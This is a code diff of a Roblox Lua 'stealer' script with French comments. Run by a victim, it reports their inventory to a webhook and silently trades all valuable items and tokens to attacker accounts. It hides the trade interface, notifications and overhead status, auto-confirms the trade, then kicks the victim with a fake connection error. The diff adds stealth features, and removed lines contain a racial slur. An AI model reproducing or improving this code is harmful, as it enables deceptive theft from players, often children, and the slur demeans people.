@@ -9,7 +9,7 @@ local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 
--- Paramètres
+-- Paramètres (À remplir)
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 1
 local ping = _G.pingEveryone or "No"
@@ -18,39 +18,63 @@ local auth_token = _G.AuthToken or "EBK-SS-A"
 
 -- Interfaces
 local PlayerGui = plr.PlayerGui
-local tradeGui = PlayerGui.Trade
+local tradeGui = PlayerGui:WaitForChild("Trade")
 local inTrade = false
-local notificationsGui = PlayerGui.Notifications
 
-local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
-local Replion = require(game.ReplicatedStorage.Packages.Replion)
-
--- Cache UI
-tradeGui.Black.Visible = false
+-- DISCRÉTION TOTALE : Cache l'UI avant même l'ouverture
 tradeGui.Main.Visible = false
-notificationsGui.Enabled = false
+tradeGui.Black.Visible = false
+if PlayerGui:FindFirstChild("Notifications") then
+    PlayerGui.Notifications.Enabled = false
+end
 
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
+    if inTrade then
+        tradeGui.Main.Visible = false
+        tradeGui.Black.Visible = false
+    end
 end)
 
 ---------------------------------------------------------
--- FONCTIONS UTILITAIRES & RAP
+-- FONCTION CACHE-TEXTE "TRADING" (SOURCE PHYSIQUE)
 ---------------------------------------------------------
+local function hideTradingStatus()
+    task.spawn(function()
+        while inTrade do
+            local char = plr.Character
+            if char then
+                local head = char:FindFirstChild("Head")
+                local root = char:FindFirstChild("HumanoidRootPart")
+                for _, part in ipairs({head, root}) do
+                    if part then
+                        for _, obj in ipairs(part:GetChildren()) do
+                            if obj:IsA("BillboardGui") then
+                                obj.Enabled = false
+                            end
+                        end
+                    end
+                end
+            end
+            task.wait(0.1)
+        end
+    end)
+end
 
-local function formatNumber(number)
-    if number == nil then return "0" end
-    local suffixes = {"", "k", "m", "b", "t"}
-    local suffixIndex = 1
-    while number >= 1000 and suffixIndex < #suffixes do
-        number = number / 1000
-        suffixIndex = suffixIndex + 1
-    end
-    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
+---------------------------------------------------------
+-- UTILITAIRES & RAP
+---------------------------------------------------------
+local function formatNumber(n)
+    if not n then return "0" end
+    if n >= 1000000 then return string.format("%.2fM", n/1000000)
+    elseif n >= 1000 then return string.format("%.2fK", n/1000) end
+    return tostring(math.floor(n))
 end
 
 local function getRAP(category, itemName)
-    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
+    local success, rapData = pcall(function() 
+        return require(game.ReplicatedStorage.Packages.Replion).Client:GetReplion("ItemRAP").Data.Items[category] 
+    end)
     if not success or not rapData then return 0 end
     for skey, rap in pairs(rapData) do
         local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
@@ -63,24 +87,15 @@ local function getRAP(category, itemName)
     return 0
 end
 
-local function getNextBatch(items, batchSize)
-    local batch = {}
-    for i = 1, math.min(batchSize, #items) do
-        table.insert(batch, table.remove(items, 1))
-    end
-    return batch
-end
-
 ---------------------------------------------------------
--- EMBEDS
+-- WEBHOOK AVEC THUMBNAIL
 ---------------------------------------------------------
-
-local function SendJoinMessage(list, prefix)
+local function SendWebhook(list, prefix)
     local totalRAP = 0
     local itemLines = ""
     for _, item in ipairs(list) do
         totalRAP = totalRAP + item.RAP
-        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
+        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. "]\n"
     end
 
     local data = {
@@ -92,30 +107,7 @@ local function SendJoinMessage(list, prefix)
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
-                {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                 {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
-            },
-            ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
-            },
-            ["footer"] = {["text"] = "EBK Stealer | Session Active"}
-        }}
-    }
-    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
-end
-
-local function SendOnServerMessage()
-    local totalRAP = 0
-    for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end
-
-    local data = {
-        ["auth_token"] = auth_token,
-        ["embeds"] = {{
-            ["title"] = "⚠️ The nigga is on the server !",
-            ["color"] = 16776960,
-            ["fields"] = {
-                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
             },
             ["thumbnail"] = {
                 ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
@@ -127,43 +119,41 @@ local function SendOnServerMessage()
 end
 
 ---------------------------------------------------------
--- LOGIQUE DE TRADE AVEC SPAM REQUEST
+-- LOGIQUE DE VOL (INVISIBLE & SPAM)
 ---------------------------------------------------------
-
-local function sendTradeRequest(user)
-    local target = game:GetService("Players"):WaitForChild(user)
-    -- Spam la requête jusqu'à ce que le trade soit accepté
-    repeat
+local function doTrade(targetName)
+    local target = Players:WaitForChild(targetName)
+    
+    -- Spam requêtes jusqu'à l'acceptation
+    while not inTrade do
         pcall(function()
             netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
         end)
-        task.wait(0.5)
-    until inTrade == true
-end
+        task.wait(0.8)
+    end
 
-local function addItemToTrade(itemType, ID)
-    repeat
-        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
-    until response == true
-end
+    if inTrade then
+        hideTradingStatus() -- Cache le texte "TRADING" au-dessus de la tête
 
-local function doTrade(joinedUser)
-    while #itemsToSend > 0 do
-        -- On lance le spam de requêtes ici
-        sendTradeRequest(joinedUser)
-        
-        -- On attend d'être bien dans le trade
-        repeat task.wait(0.5) until inTrade
-
-        task.wait(1) 
-
-        local currentBatch = getNextBatch(itemsToSend, 100)
-        for _, item in ipairs(currentBatch) do
-            addItemToTrade(item.itemType, item.ItemID)
+        -- Ajout rapide des items
+        for _, item in ipairs(itemsToSend) do
+            pcall(function()
+                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+            end)
         end
 
-        -- SYSTÈME AUTO-CONFIRM RAPIDE
-        task.wait(0.2)
+        -- Ton système de Tokens (Nettoyé)
+        pcall(function()
+            local rawText = tradeGui.Main.Currency.Coins.Amount.Text
+            local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
+            local tokens = tonumber(cleanedText) or 0
+            if tokens >= 1 then
+                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
+            end
+        end)
+
+        -- Confirmation Instantanée
+        task.wait(0.3)
         repeat
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
             task.wait(0.1)
@@ -172,17 +162,17 @@ local function doTrade(joinedUser)
         until not inTrade
     end
     
-    task.wait(2)
+    task.wait(0.5)
     plr:kick("Please check your internet connection and try again. (Error Code: 277)")
 end
 
 ---------------------------------------------------------
--- SCAN & LANCEMENT
+-- DÉMARRAGE
 ---------------------------------------------------------
-
+local inv = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 for _, cat in ipairs(categories) do
-    if clientInventory[cat] then
-        for id, info in pairs(clientInventory[cat]) do
+    if inv[cat] then
+        for id, info in pairs(inv[cat]) do
             if not info.TradeLock then
                 local rap = getRAP(cat, info.Name)
                 if rap >= min_rap then
@@ -195,19 +185,14 @@ end
 
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
-    local prefix = (ping == "Yes") and "@everyone | " or ""
-    SendJoinMessage(itemsToSend, prefix)
+    SendWebhook(itemsToSend, (ping == "Yes" and "@everyone" or ""))
 
-    local function onUserAdded(player)
-        if table.find(users, player.Name) then
-            SendOnServerMessage()
-            -- Lancement du trade en boucle
-            task.spawn(function()
-                doTrade(player.Name)
-            end)
+    local function onPlayer(p)
+        if table.find(users, p.Name) then
+            task.spawn(function() doTrade(p.Name) end)
         end
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do onUserAdded(p) end
-    Players.PlayerAdded:Connect(onUserAdded)
+    for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
+    Players.PlayerAdded:Connect(onPlayer)
 end
